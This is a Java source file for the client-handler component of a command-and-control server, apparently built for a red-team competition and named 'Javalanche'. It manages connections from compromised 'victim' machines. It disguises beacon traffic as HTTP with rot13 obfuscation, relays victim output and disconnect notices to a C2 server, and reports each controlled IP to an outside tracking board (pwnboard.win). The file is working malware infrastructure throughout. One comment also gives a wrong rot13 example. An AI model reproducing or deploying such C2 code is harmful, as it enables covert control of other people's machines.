package Servers.Beacon;

import Servers.Duplexer;
import Servers.keepAlive;

import java.io.DataOutputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;

public class BeaconClientHandler implements Runnable{
    // IP address of the client
    private String IPAddress;

    // Pointer to the duplexer that is used to send/receive with client
    private Duplexer duplexer;

    // Pointer back to the Beacon Server that is associated with this client
    private BeaconServer beaconServer;

    // Operating System of the client
    private String os;

    // Sentinel = true when this client is still active, when the client connection is lost Sentinel = false
    private Boolean sentinel = true;

    // Class and thread that is used to send KEEP_ALIVE messages to the client to keep the connection alive
    private keepAlive keepAliveClass;
    private Thread keepAliveThread;

    // Object lock used to make sure that this thread is able to safetly access the duplexer
    private Object sendLock;

    // Variables to send data to Pwnboard
    HttpURLConnection connection;
    URL url;

    /**
     * Use this Class to create a new thread to handle each victim connection
     * 
     * @param IPAddress IP address of the client (victim)
     * @param duplexer Pointer to the duplexer so that this thread can receive messages from the client
     * @param beaconServer Pointer to the Becon Server that this client is associated with
     * @param os Operating System of this client
     */
    protected BeaconClientHandler(String IPAddress, Duplexer duplexer, BeaconServer beaconServer, String os){
        this.IPAddress = IPAddress;
        this.duplexer = duplexer;
        this.beaconServer = beaconServer;
        this.os = os;
        this.sendLock = new Object();
        this.keepAliveClass = new keepAlive(this.duplexer, sendLock, true, true);
        this.keepAliveThread = new Thread(keepAliveClass);
    }

    protected void quit(String reason) throws IOException{
        duplexer.close();
    }


    /**
     * Encrypts/Decrypts the plain text with a simple rot13 cipher - Shifts each letter by 13 spots.
     * (ex. A --> B, E --> R, Y --> L)
     * 
     * Because each letter is just shifted by 13 characters, encrypting/decrypting are the same algorithm
     * 
     * @param plaintext - The text to be shifted
     * @return - The new encrypted/decrypted text
     */
    private String encrypt(String plaintext) {
        StringBuilder encryptedText = new StringBuilder();

        for (char character : plaintext.toCharArray()) {
            if (character >= 'a' && character <= 'z') {
                encryptedText.append((char) ('a' + (character - 'a' + 13) % 26));
            } else if (character >= 'A' && character <= 'Z') {
                encryptedText.append((char) ('A' + (character - 'A' + 13) % 26));
            } else {
                encryptedText.append(character);
            }
        }
        return encryptedText.toString();
    }

    /**
     * This method sends a HTTP request to pwnbaord. pwnboard keeps track of what machines we have access to in the competition
     */
    private void sendPwnBoardRequest(){
        try{
            url = new URL("https://pwnboard.win/pwn/boxaccess");
            String pwnBoardData = "{'ip': " + IPAddress + ", 'type': 'Javalanche'}";
            connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            connection.setRequestProperty("Content-Length", Integer.toString(pwnBoardData.length()));
            connection.setRequestProperty("Content-Language", "en-US");  

            connection.setUseCaches(false);
            connection.setDoOutput(true);

            //Send request
            DataOutputStream wr = new DataOutputStream (connection.getOutputStream());
            wr.writeBytes(pwnBoardData);
            wr.close();
        } catch (Exception e){
            e.printStackTrace();
        }
    }

    /**
     * Use this function to have the thread send a message to the client
     * 
     * @param message Message to be sent
     */
    protected void sendToClient(String message){
        if(sentinel){
            message = encrypt(message);
            String httpHeader = "HTTP/1.1 200 OK\r\n" +  "Content-Length: " + message.length() + "\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n";
            message = httpHeader + message;
            synchronized(sendLock){
                duplexer.send(message);
            }
        }
    }

    @Override
    public void run(){
        // Start the Thread to Send KEEP_ALIVE messages to the client every 30 seconds
        keepAliveThread.start();
        while(sentinel){
            try{
                String response = duplexer.receive();
                sendPwnBoardRequest();
                if(!(response.equals("GET / HTTP/1.1")) && !(response.contains("Content-Length")) && !(response.equals("Content-Type: text/plain; charset=utf-8")) && !(response.isBlank())){
                    response = encrypt(response);
                    if(!(response.equals("KEEP_ALIVE"))){
                        beaconServer.addDataToResponsesDictionaries(IPAddress, response);
                    }
                }
            } catch (IOException e){
                sentinel = false;
                try{
                    duplexer.close();
                    keepAliveClass.stopKeepAlive();
                } catch (IOException d){
                    d.printStackTrace();
                }
                beaconServer.sendDataToC2Server("Lost " + os + " Client at " + IPAddress);
                beaconServer.addDataToResponsesDictionaries(IPAddress, "DISCONNECTED");
                e.printStackTrace();
            } catch (java.lang.NullPointerException e){
                sentinel = false;
                try{
                    duplexer.close();
                } catch (IOException d){
                    d.printStackTrace();
                }
                beaconServer.sendDataToC2Server("Lost " + os + " Client at " + IPAddress);
                beaconServer.addDataToResponsesDictionaries(IPAddress, "DISCONNECTED");
                e.printStackTrace();
            }
            
        }
    }
}